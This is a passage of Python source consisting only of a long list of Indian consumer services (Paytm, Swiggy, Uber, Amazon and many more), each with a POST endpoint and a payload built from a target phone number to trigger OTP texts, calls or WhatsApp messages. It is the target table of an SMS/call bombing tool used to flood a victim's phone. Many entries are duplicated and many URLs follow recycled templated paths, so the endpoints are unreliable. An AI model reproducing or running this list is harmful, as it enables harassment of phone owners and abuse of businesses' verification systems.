    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Cred SMS', 'url': 'https://cred.club/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Uber Call', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zepto Call', 'url': 'https://zepto.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Wakefit SMS', 'url': 'https://wakefit.co/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Shiprocket WhatsApp', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Rapido WhatsApp', 'url': 'https://rapido.bike/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Gokwik Call', 'url': 'https://gokwik.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Uber Call', 'url': 'https://uber.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Cred Call', 'url': 'https://cred.club/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Uber Call', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Nykaa SMS', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Paytm Call', 'url': 'https://paytm.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Cred WhatsApp', 'url': 'https://cred.club/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Dmart WhatsApp', 'url': 'https://dmart.ready.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Cred SMS', 'url': 'https://cred.club/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Myntra Call', 'url': 'https://myntra.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Instamart Call', 'url': 'https://instamart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zomato Call', 'url': 'https://zomato.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Instamart WhatsApp', 'url': 'https://instamart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Bigbasket SMS', 'url': 'https://bigbasket.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Doubtnut WhatsApp', 'url': 'https://doubtnut.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Newme Call', 'url': 'https://newme.asia/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Jupiter SMS', 'url': 'https://jupiter.money/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zivame WhatsApp', 'url': 'https://zivame.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Khatabook WhatsApp', 'url': 'https://khatabook.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Myntra SMS', 'url': 'https://myntra.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Khatabook Call', 'url': 'https://khatabook.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Phonepe SMS', 'url': 'https://phonepe.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Shiprocket Call', 'url': 'https://shiprocket.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Amazon WhatsApp', 'url': 'https://amazon.in/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Wakefit WhatsApp', 'url': 'https://wakefit.co/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Cred Call', 'url': 'https://cred.club/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Tatacapital Call', 'url': 'https://tatacapital.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Instamart Call', 'url': 'https://instamart.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Khatabook Call', 'url': 'https://khatabook.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Paytm WhatsApp', 'url': 'https://paytm.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Rapido Call', 'url': 'https://rapido.bike/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Oyorooms SMS', 'url': 'https://oyorooms.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Phonepe WhatsApp', 'url': 'https://phonepe.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Instamart SMS', 'url': 'https://instamart.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Pokerbaazi SMS', 'url': 'https://pokerbaazi.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': '1Mg SMS', 'url': 'https://1mg.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Nykaa Call', 'url': 'https://nykaa.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zivame Call', 'url': 'https://zivame.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Olacabs WhatsApp', 'url': 'https://olacabs.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Meesho Call', 'url': 'https://meesho.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Zomato SMS', 'url': 'https://zomato.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Jupiter Call', 'url': 'https://jupiter.money/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Zomato WhatsApp', 'url': 'https://zomato.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Pharmeasy SMS', 'url': 'https://pharmeasy.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Zivame SMS', 'url': 'https://zivame.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Wakefit Call', 'url': 'https://wakefit.co/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Goibibo SMS', 'url': 'https://goibibo.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Pokerbaazi Call', 'url': 'https://pokerbaazi.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Gokwik SMS', 'url': 'https://gokwik.co/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Paytm SMS', 'url': 'https://paytm.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Pokerbaazi WhatsApp', 'url': 'https://pokerbaazi.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Uber Call', 'url': 'https://uber.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Gokwik WhatsApp', 'url': 'https://gokwik.co/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Amazon SMS', 'url': 'https://amazon.in/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Cred Call', 'url': 'https://cred.club/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Goibibo Call', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Makemytrip SMS', 'url': 'https://makemytrip.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Shiprocket SMS', 'url': 'https://shiprocket.in/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Nykaa Call', 'url': 'https://nykaa.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Swiggy Call', 'url': 'https://swiggy.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Makemytrip Call', 'url': 'https://makemytrip.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': '1Mg Call', 'url': 'https://1mg.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Swiggy WhatsApp', 'url': 'https://swiggy.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Newme SMS', 'url': 'https://newme.asia/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Amazon Call', 'url': 'https://amazon.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Blinkit WhatsApp', 'url': 'https://blinkit.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Dmart Call', 'url': 'https://dmart.ready.in/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Tatacapital SMS', 'url': 'https://tatacapital.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Uber Call', 'url': 'https://uber.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Bigbasket Call', 'url': 'https://bigbasket.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Ajio WhatsApp', 'url': 'https://ajio.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Nykaa WhatsApp', 'url': 'https://nykaa.com/gw/login-register/v1/sendOTP', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Doubtnut Call', 'url': 'https://doubtnut.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Olacabs Call', 'url': 'https://olacabs.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phoneNumber": phone, "otpType": "voice"}},
    {'name': 'Uber WhatsApp', 'url': 'https://uber.com/api/v2/auth/send-otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Ajio SMS', 'url': 'https://ajio.com/api/v2/otpgenerate', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Api-Gateway SMS', 'url': 'https://api-gateway.juno.lenskart.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/api/v2/login/sendotp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobileNumber": phone}},
    {'name': 'Api-Gateway Call', 'url': 'https://api-gateway.juno.lenskart.com/api/v3/user/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Olacabs SMS', 'url': 'https://olacabs.com/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Goibibo WhatsApp', 'url': 'https://goibibo.com/v1/user/otplogin', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"number": phone, "otpOnCall": True}},
    {'name': 'Ajio Call', 'url': 'https://ajio.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Jupiter WhatsApp', 'url': 'https://jupiter.money/v3/auth/otp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
    {'name': 'Phonepe Call', 'url': 'https://phonepe.com/api/v1/auth/otpsend', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"mobile": phone}},
    {'name': 'Khatabook SMS', 'url': 'https://khatabook.com/api/v1/customers/sendOtp', 'method': 'POST', 'headers': {'Content-Type': 'application/json'}, 'data': lambda phone: {"phone": phone, "countryCode": "91"}},
